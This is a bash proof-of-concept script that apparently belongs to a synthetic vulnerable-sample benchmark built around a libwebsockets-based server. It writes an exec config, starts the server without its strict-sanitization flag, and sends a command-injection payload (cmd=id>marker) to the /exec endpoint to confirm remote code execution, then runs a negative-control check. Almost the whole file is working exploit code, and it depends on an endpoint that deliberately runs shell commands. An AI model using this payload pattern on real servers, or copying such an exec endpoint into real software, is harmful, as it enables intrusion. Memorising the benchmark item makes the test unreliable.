#!/usr/bin/env bash
# PoC for 186_libwebsockets_C3I2S3
# Axes: C3 (config file + runtime state) / I2 (snprintf buffer) / S3 (strict sanitization, bypass by omitting --strict-exec)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/lws_server"
WWWROOT="/tmp/poc_186_www"
MARKER="/tmp/poc_186_marker"
CONF="/tmp/poc_186.conf"
PORT=18186
NEG_PORT=19186

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" "$CONF"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# Create exec config file (C3: exec_mode + secret)
cat > "$CONF" <<EOF
exec_mode = 1
exec_secret = s3cr3t
EOF

# Start server with exec config (NO --strict-exec, so S3 sanitization bypassed)
echo "[*] starting lws_server with --exec-config on port $PORT (no --strict-exec)..."
"$BINARY" --port "$PORT" --wwwroot "$WWWROOT" --exec-config "$CONF" &
SERVER_PID=$!
sleep 0.5

# C3: call /exec/init first
echo "[*] calling /exec/init to satisfy runtime state..."
curl -sf "http://127.0.0.1:${PORT}/exec/init?token=s3cr3t" > /dev/null || true

# Trigger exploit (S3 bypass: --strict-exec not passed)
echo "[*] sending payload: cmd=id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null || true

# Verify RCE
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# Negative control: config with exec_mode=0; /exec/init returns 403
echo "[*] verifying gate: /exec locked when config has exec_mode=0..."
kill "$SERVER_PID" 2>/dev/null; wait "$SERVER_PID" 2>/dev/null || true
SERVER_PID=0

NEG_CONF=/tmp/poc_186_neg.conf
cat > "$NEG_CONF" <<EOF
exec_mode = 0
exec_secret = s3cr3t
EOF

"$BINARY" --port "$NEG_PORT" --wwwroot "$WWWROOT" --exec-config "$NEG_CONF" &
NEG_PID=$!
sleep 0.5
INIT_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec/init?token=s3cr3t" || echo "000")
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || echo "000")
kill "$NEG_PID" 2>/dev/null; wait "$NEG_PID" 2>/dev/null || true
rm -f "$NEG_CONF"

if [[ "$INIT_CODE" == "403" ]]; then
    echo "[+] gate check passed: /exec/init returned 403 with exec_mode=0"
else
    echo "[!] gate check: /exec/init returned $INIT_CODE (expected 403)"
fi
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: /exec returned 404 without initialization"
else
    echo "[!] gate check: /exec returned $HTTP_CODE"
fi
